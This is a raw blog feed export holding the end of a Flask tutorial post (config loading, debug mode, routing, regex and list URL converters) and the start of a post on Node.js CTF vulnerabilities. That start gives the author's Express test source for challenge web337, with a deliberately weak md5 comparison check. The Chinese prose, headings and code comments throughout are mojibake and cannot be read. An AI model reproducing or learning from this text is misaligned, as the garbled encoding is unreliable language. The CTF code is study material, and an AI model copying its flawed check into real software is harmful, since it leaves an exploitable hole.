class="number">8888</span>)</span><br></pre></td></tr></table></figure><p>æŒ‰ç…§ä¸Šé¢çš„wsgiï¼Œæ˜¯ä¸æ˜¯æ„æ€å°±æ˜¯è¯´ï¼ŒHttp Serveræ¥å—å®¢æˆ·ç«¯çš„è¯·æ±‚ï¼Œè·¯ç”±æ˜¯â€™/â€˜,ç„¶åè½¬å‘requeståˆ°web flaskæ¡†æ¶ï¼Œç„¶åflaské€šè¿‡è·¯ç”±æ˜ å°„åˆ°è§†å›¾çš„å‡½æ•°å³index(),è¿”å›â€˜Helloworldâ€™ç»™Http Severï¼Œç„¶åserverè½¬å‘ç»™å®¢æˆ·ç«¯</p><p>ah,æˆ‘å‘ç°äº†ä¸€ä¸ªwarning:è¿™ä¸æ˜¯wsgiæœåŠ¡å™¨</p><p><img src="1.png" alt="image-20211209175508978"></p><h3 id="ç›¸å…³é…ç½®å‚æ•°"><a href="#ç›¸å…³é…ç½®å‚æ•°" class="headerlink" title="ç›¸å…³é…ç½®å‚æ•°"></a>ç›¸å…³é…ç½®å‚æ•°</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,</span></span></span><br><span class="line"><span class="function"><span class="params">             import_name: <span class="built_in">str</span>, <span class="comment">#flaskç¨‹åºæ‰€åœ¨çš„åŒ…ï¼Œä¼ __name__å°±å¯ä»¥å¾—åˆ°ï¼Œå…¶å¯ä»¥å†³å®šflaskè®¿é—®é™æ€æ–‡ä»¶æ—¶æŸ¥æ‰¾çš„è·¯å¾„</span></span></span></span><br><span class="line"><span class="function"><span class="params">             static_url_path: <span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="literal">None</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">             static_folder: <span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="string">&quot;static&quot;</span>, <span class="comment">#é™æ€æ–‡ä»¶å­˜å‚¨çš„æ–‡ä»¶å¤¹</span></span></span></span><br><span class="line"><span class="function"><span class="params">             static_host: <span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="literal">None</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">             host_matching: <span class="built_in">bool</span> = <span class="literal">False</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">             subdomain_matching: <span class="built_in">bool</span> = <span class="literal">False</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">             template_folder: <span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="string">&quot;templates&quot;</span>,<span class="comment">#æ¨¡æ¿æ–‡ä»¶å­˜å‚¨çš„æ–‡ä»¶å¤¹</span></span></span></span><br><span class="line"><span class="function"><span class="params">             instance_path: <span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="literal">None</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">             instance_relative_config: <span class="built_in">bool</span> = <span class="literal">False</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">             root_path: <span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="literal">None</span></span>) -&gt; <span class="type">Any</span></span></span><br></pre></td></tr></table></figure><h3 id="åŠ è½½é…ç½®æ–‡ä»¶"><a href="#åŠ è½½é…ç½®æ–‡ä»¶" class="headerlink" title="åŠ è½½é…ç½®æ–‡ä»¶"></a>åŠ è½½é…ç½®æ–‡ä»¶</h3><p>åœ¨Flaskç¨‹åºè¿è¡Œçš„æ—¶å€™ï¼Œå¯ä»¥ç»™Flaskè®¾ç½®ç›¸å…³é…ç½®ï¼ˆæˆ‘ç†è§£çš„é…ç½®ï¼Œå°±æ˜¯è¯´ç»™è¿™ä¸ªä¸œè¥¿æ·»åŠ å®ƒåŸæ¥ä¸å…·å¤‡çš„åŠŸèƒ½ã€‚æ¯”å¦‚ï¼Œè¿™ä¸ªFlaskæ¡†æ¶å°±æ˜¯ä¸€ä¸ªå¾ˆç®€å•çš„åªèƒ½åœ¨é¡µé¢ä¸­è¾“å‡ºhelloworldçš„ä¸€ä¸ªæ¡†æ¶ï¼Œæˆ‘ç»™ä»–æ·»åŠ äº†ä¸€ä¸ªå¯ä»¥è¿æ¥æ•°æ®åº“çš„é…ç½®ï¼Œé‚£ä¹ˆå®ƒå°±å¯ä»¥è·Ÿæˆ‘çš„æ•°æ®åº“ç›¸è¿æ¥ï¼Œåœ¨é¡µé¢ä¸Šå®ç°å¯¹æˆ‘çš„æ•°æ®åº“çš„ä¸€ä¸ªå¢åˆ æ”¹æŸ¥ï¼‰</p><ul><li>ä»é…ç½®å¯¹è±¡ä¸­åŠ è½½ï¼ˆå¸¸ç”¨ï¼‰<ul><li>app.config.from_object()</li></ul></li><li>ä»é…ç½®æ–‡ä»¶ä¸­åŠ è½½<ul><li>app.config.from_pyfile()</li></ul></li><li>ä»ç¯å¢ƒå˜é‡ä¸­åŠ è½½ï¼ˆä¸å¸¸ç”¨ï¼Œæˆ‘æ„Ÿè§‰æˆ‘ä»¬çš„ç¨‹åºæœ€ç»ˆæ˜¯è®©å®¢æˆ·ä½¿ç”¨çš„ï¼Œæˆ‘ä»¬å¦‚æœåœ¨è®©å®¢æˆ·è¿›è¡Œç¯å¢ƒå˜é‡çš„é…ç½®ï¼Œé‚£ä¼šå¤§å¤§çš„å‡å°‘å®¢æˆ·çš„ä½¿ç”¨é‡ï¼‰<ul><li>app.config.from_envvar()</li></ul></li></ul><h4 id="é…ç½®å¯¹è±¡åŠ è½½"><a href="#é…ç½®å¯¹è±¡åŠ è½½" class="headerlink" title="é…ç½®å¯¹è±¡åŠ è½½"></a>é…ç½®å¯¹è±¡åŠ è½½</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line"><span class="comment">#å®šä¹‰ä¸€ä¸ªé…ç½®å¯¹è±¡,é‡Œé¢å®šä¹‰éœ€è¦ç»™appæ·»åŠ çš„ä¸€ç³»åˆ—é…ç½®</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    DEBUG=<span class="literal">True</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="comment">#ä»é…ç½®å¯¹è±¡ä¸­åŠ è½½é…ç½®</span></span><br><span class="line">app.config.from_object(Config)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    a=<span class="number">1</span>/<span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;HelloWorld&#x27;</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">8888</span>)</span><br></pre></td></tr></table></figure><p>â€‹    å…³äº<a href="https://blog.csdn.net/pick_ears/article/details/109234750">DEBUG</a>çš„ä½¿ç”¨</p><h4 id="ä»é…ç½®æ–‡ä»¶ä¸­åŠ è½½é…ç½®"><a href="#ä»é…ç½®æ–‡ä»¶ä¸­åŠ è½½é…ç½®" class="headerlink" title="ä»é…ç½®æ–‡ä»¶ä¸­åŠ è½½é…ç½®"></a>ä»é…ç½®æ–‡ä»¶ä¸­åŠ è½½é…ç½®</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ä»é…ç½®æ–‡ä»¶ä¸­åŠ è½½é…ç½®</span></span><br><span class="line">app.config.from_pyfile(<span class="string">&#x27;config.ini&#x27;</span>)</span><br><span class="line"><span class="comment">#config.iniæ–‡ä»¶ä¸­çš„å†…å®¹</span></span><br><span class="line">DEBUG=<span class="literal">True</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="2.png" alt="image-20211209173704825"></p><p>ä»ä¸­å¯ä»¥çœ‹åˆ°DEBUGæ¨¡å—å·²ç»å¼€å¯</p><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Flaskåº”ç”¨å°†ä¸€äº›å¸¸ç”¨çš„é…ç½®è®¾ç½®æˆç«‹åº”ç”¨ç¨‹åºå¯¹è±¡çš„å±æ€§ï¼Œä¹Ÿå¯ä»¥é€šè¿‡è®¾ç½®/è·å–æŸäº›é…ç½®</span></span><br><span class="line">app.debug=<span class="literal">True</span></span><br><span class="line"><span class="comment">#è¿™æ ·ä¹Ÿå¯ä»¥æˆåŠŸ</span></span><br></pre></td></tr></table></figure></blockquote><p><img src="3.png" alt="image-20211209175820363"></p><h4 id="è¯»å–é…ç½®"><a href="#è¯»å–é…ç½®" class="headerlink" title="è¯»å–é…ç½®"></a>è¯»å–é…ç½®</h4><ul><li>app.config.get()</li></ul><p><img src="4.png" alt="image-20211209175914630"></p><blockquote><p>å‘ç°äº†ä¸€ä¸ªé—®é¢˜,æˆ‘åªæ‰“å°äº†ä¸€æ¬¡config.getï¼ˆï¼‰,ä¸ºä»€ä¹ˆå‡ºç°äº†ä¸¤æ¬¡?</p><p>æˆ‘å°è¯•äº†ä¸‹è¿°çš„ä»£ç æµ‹è¯•</p></blockquote><p><img src="5.png" alt="image-20211209181506114"></p><p>æ„Ÿè§‰åº”è¯¥æ˜¯å…ˆä»å¤´åˆ°å°¾è¿‡ä¸€éï¼Œç„¶åé‡åˆ°app.runï¼ˆï¼‰ï¼Œç„¶åï¼Œrunæ˜¯å¯åŠ¨è¿™ä¸ªwebç¨‹åºï¼Œç„¶åå†ä»å¤´åˆ°å°¾çš„æ¥ä¸€é</p><h3 id="è·¯ç”±å®šä¹‰"><a href="#è·¯ç”±å®šä¹‰" class="headerlink" title="è·¯ç”±å®šä¹‰"></a>è·¯ç”±å®šä¹‰</h3><h4 id="æŒ‡å®šè·¯ç”±åœ°å€"><a href="#æŒ‡å®šè·¯ç”±åœ°å€" class="headerlink" title="æŒ‡å®šè·¯ç”±åœ°å€"></a>æŒ‡å®šè·¯ç”±åœ°å€</h4><p><img src="6.png" alt="image-20211209182156571"></p><p>ä»”ç»†çœ‹è¿™é‡Œæœ‰ä¸€ä¸ª404ï¼Œä¸Šæ¬¡åœ¨åšä¸€é“ctfæ–‡ä»¶ä¸Šä¼ é¢˜ç›®çš„æ—¶å€™ç”¨åˆ°äº†åŒ…å«é•¿æ•´å½¢ipçš„æ—¶å€™ï¼Œä¹Ÿæ˜¯å› ä¸ºè¿™ä¸ª404ï¼Œæ‰æ²¡æœ‰åŒ…å«æˆåŠŸ</p><p>favicon.icoæ˜¯é¡µé¢çš„ä¸€ä¸ªé¡µé¢å›¾æ ‡ï¼Œè¿™æ˜¯æµè§ˆå™¨çš„ä¸€ä¸ªé»˜è®¤è¡Œä¸ºï¼Œå½“æ‰“å¼€ä¸€ä¸ªç½‘é¡µçš„æ—¶å€™ï¼Œæµè§ˆå™¨éƒ½ä¼šå»è¯·æ±‚é¡µé¢å›¾æ ‡ï¼Œä½†æ˜¯æˆ‘è¿™é‡Œæ²¡æœ‰ï¼Œæ‰€ä»¥å°±ä¼šè¿”å›404</p><p><img src="7.png" alt="image-20211209182740968"></p><p><img src="8.png" alt="image-20211209182826940"></p><p>å°±å‰é¢çš„è¿™ä¸ªå°å›¾æ ‡</p><p>ä½†æ˜¯</p><p><img src="9.png" alt="image-20211209184549199"></p><p><img src="10.png" alt="image-20211209184602322"></p><p>å°±ä¸ä¼šå‡ºç°è¿™ç§æƒ…å†µï¼Œå…·ä½“åŸå› æ˜¯ä»€ä¹ˆï¼Œæˆ‘æš‚æ—¶ä¸çŸ¥é“</p><p>æ„Ÿè§‰æ˜¯æµè§ˆå™¨å¯¹127.0.0.1ä»¥åŠå…¶ä»–ipçš„æ“ä½œæ‰‹æ®µä¸ä¸€æ ·</p><h4 id="ç»™è·¯ç”±ä¼ é€’å‚æ•°"><a href="#ç»™è·¯ç”±ä¼ é€’å‚æ•°" class="headerlink" title="ç»™è·¯ç”±ä¼ é€’å‚æ•°"></a>ç»™è·¯ç”±ä¼ é€’å‚æ•°</h4><p><img src="11.png" alt="image-20211210162419262"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ç”±è·¯ç”±ä¼ é€’å‚æ•°</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/user/&lt;user_id&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">user_info</span>(<span class="params">user_id</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(user_id))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;hello %s&#x27;</span> % user_id</span><br><span class="line"></span><br><span class="line"><span class="comment">#è·¯ç”±ä¼ é€’çš„å‚æ•°é»˜è®¤æ˜¯ string å¤„ç†ï¼Œä¹Ÿå¯ä»¥æŒ‡å®šå‚æ•°ç±»å‹</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/user/&lt;int:user_id&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">user_info1</span>(<span class="params">user_id</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">type</span>(user_id))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;hello %d&#x27;</span> % user_id</span><br></pre></td></tr></table></figure><h4 id="æŒ‡å®šè¯·æ±‚æ–¹å¼"><a href="#æŒ‡å®šè¯·æ±‚æ–¹å¼" class="headerlink" title="æŒ‡å®šè¯·æ±‚æ–¹å¼"></a>æŒ‡å®šè¯·æ±‚æ–¹å¼</h4><p>åœ¨Flaskä¸­ç¬¬ä¸€ä¸€ä¸ªè·¯ç”±ï¼Œé»˜è®¤è¯·æ±‚æ–¹å¼ä¸ºï¼š</p><ul><li>GET</li><li>OPTIONS(è‡ªå¸¦)</li><li>HEAD(è‡ªå¸¦)</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>,methods = [<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    <span class="keyword">return</span> request.method</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">8888</span>)</span><br></pre></td></tr></table></figure><h4 id="æ­£åˆ™åŒ¹é…è·¯ç”±"><a href="#æ­£åˆ™åŒ¹é…è·¯ç”±" class="headerlink" title="æ­£åˆ™åŒ¹é…è·¯ç”±"></a>æ­£åˆ™åŒ¹é…è·¯ç”±</h4><p>åœ¨webå¼€å‘ä¸­ï¼Œå¯èƒ½ä¼šæœ‰é™åˆ¶ç”¨æˆ·è®¿é—®è§„åˆ™çš„åœºæ™¯ï¼Œé‚£ä¹ˆè¿™ä¸ªæ—¶å€™å°±ä¼šç”¨åˆ°æ­£åˆ™åŒ¹é…ï¼Œæ ¹æ®è‡ªå·±çš„è§„åˆ™å»é™å®šè¯·æ±‚å‚æ•°è¿›è¡Œè®¿é—®</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> werkzeug.routing <span class="keyword">import</span> BaseConverter</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RegexConverter</span>(<span class="params">BaseConverter</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,url_map,*args</span>):</span></span><br><span class="line">        <span class="built_in">super</span>(RegexConverter,self).__init__(url_map)</span><br><span class="line">        <span class="comment">#args[0]æ¥æ”¶çš„æ˜¯æˆ‘ä»¬å®šä¹‰çš„æ­£åˆ™è¡¨è¾¾å¼</span></span><br><span class="line">        <span class="comment">#self.regexå…¶å®å°±æ˜¯å¯¹BaseConvertä¸­regexçš„é‡å†™</span></span><br><span class="line">        self.regex = args[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(self.regex)</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        åŸç”Ÿçš„args</span></span><br><span class="line"><span class="string">        args[0]:[^/]+</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#re()ç›¸å½“äºRegexpConvertï¼ˆï¼‰ï¼Œé‚£ä¹ˆre(&quot;[0-9]&#123;6&#125;&quot;)ç›¸å½“äºç»™RegexConverterçš„__init__ä¼ é€’äº†å‚æ•°&quot;[0-9]&#123;6&#125;&quot;</span></span><br><span class="line">app.url_map.converters[<span class="string">&#x27;re&#x27;</span>] = RegexConverter</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/reg/&lt;re(&quot;[0-9]&#123;6&#125;&quot;):user_id&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reg</span>(<span class="params">user_id</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;ç”¨æˆ·çš„idæ˜¯: %s&quot;</span> % user_id</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;hello world&#x27;</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">8888</span>)</span><br></pre></td></tr></table></figure><h5 id="to-python"><a href="#to-python" class="headerlink" title="to_python"></a>to_python</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> werkzeug.routing <span class="keyword">import</span> BaseConverter</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ListConverter</span>(<span class="params">BaseConverter</span>):</span></span><br><span class="line">    regex= <span class="string">&#x27;(\\d+,?)+\\d$&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">to_python</span>(<span class="params">self,value</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;here&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> value.split(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">app.url_map.converters[<span class="string">&quot;list&quot;</span>] = ListConverter</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/reg/&lt;list:user_id&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reg</span>(<span class="params">user_id</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;ç”¨æˆ·çš„idæ˜¯: %s&quot;</span> % user_id</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;hello world&#x27;</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">8888</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="12.png" alt="image-20211211203619629"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, url_for</span><br><span class="line"><span class="keyword">from</span> werkzeug.routing <span class="keyword">import</span> BaseConverter</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> redirect</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ListConverter</span>(<span class="params">BaseConverter</span>):</span></span><br><span class="line">    regex= <span class="string">&#x27;(\\d+,?)+\\d$&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">to_python</span>(<span class="params">self,value</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;to_python&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> value.split(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">to_url</span>(<span class="params">self, value</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;to_url&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;,&quot;</span>.join(<span class="built_in">str</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#app.url_map.converters[&#x27;re&#x27;] = RegexConverter</span></span><br><span class="line">app.url_map.converters[<span class="string">&quot;list&quot;</span>] = ListConverter</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/reg/&lt;list:user_id&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">demo2</span>(<span class="params">user_id</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;ç”¨æˆ·çš„idæ˜¯: %s&quot;</span> % user_id</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/demo3&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">demo3</span>():</span></span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;demo2&#x27;</span>,user_id=[<span class="number">1</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">8888</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="13.png" alt="image-20211211205615504"></p><h3 id="ç®€å•è§†å›¾"><a href="#ç®€å•è§†å›¾" class="headerlink" title="ç®€å•è§†å›¾"></a>ç®€å•è§†å›¾</h3><p>åœ¨ä½¿ç”¨Flaskç»™å®¢æˆ·ç«¯è¿”å›JSONæ•°æ®æ—¶ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨jsonifyç”Ÿæˆä¸€ä¸ªJSONå“åº”</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Node.jså¸¸è§æ¼æ´å­¦ä¹ </title>
      <link href="/2021/11/30/Node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
      <url>/2021/11/30/Node-js%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>###ä¸ºå•¥å†™çš„ä¸œè¥¿åˆæ²¡äº†ï¼Œä¸ºå•¥æ€»æ˜¯è®°ä¸ä½ä¿å­˜â€¦</p><h1 id="web337"><a href="#web337" class="headerlink" title="web337"></a>web337</h1><p>æˆ‘è‡ªå·±åšæµ‹è¯•æ—¶ç”¨çš„æºç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">var express &#x3D; require(&#39;express&#39;);</span><br><span class="line">var router &#x3D; express.Router();</span><br><span class="line">let app &#x3D; express();</span><br><span class="line">app.listen(4000);</span><br><span class="line">var crypto &#x3D; require(&#39;crypto&#39;);</span><br><span class="line">app.use(&#39;&#x2F;&#39;,router)</span><br><span class="line"></span><br><span class="line">function md5(s) &#123;</span><br><span class="line">  return crypto.createHash(&#39;md5&#39;)</span><br><span class="line">    .update(s)</span><br><span class="line">    .digest(&#39;hex&#39;);</span><br><span class="line">&#125;</span><br><span class="line">var flag&#x3D;&#39;flag&#123;123&#125;&#39;;</span><br><span class="line"></span><br><span class="line">&#x2F;* GET home page. *&#x2F;</span><br><span class="line">router.get(&#39;&#x2F;&#39;, function(req, res, next) &#123;</span><br><span class="line">  res.type(&#39;html&#39;);</span><br><span class="line">  var flag&#x3D;&#39;xxxxxxx&#39;;</span><br><span class="line">  var a &#x3D; req.query.a;</span><br><span class="line">  var b &#x3D; req.query.b;</span><br><span class="line">  console.log(md5(a+flag));</span><br><span class="line">  console.log(md5(b+flag));</span><br><span class="line">  console.log(a.length);</span><br><span class="line">  console.log(b.length);</span><br><span class="line">  console.log(a!&#x3D;&#x3D;b);</span><br><span class="line">  console.log(a);</span><br><span class="line">  console.log(b);</span><br><span class="line">  if(a &amp;&amp; b &amp;&amp; a.length&#x3D;&#x3D;&#x3D;b.length &amp;&amp; a!&#x3D;&#x3D;b &amp;&amp; md5(a+flag)&#x3D;&#x3D;&#x3D;md5(b+flag))&#123;</span><br><span class="line">  console.log(&#39;flagï¼ï¼&#39;);</span><br><span class="line">  &#125;else&#123;</span><br><span class="line">  console.log(&#39;noï¼ï¼&#39;);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">module.exports &#x3D; 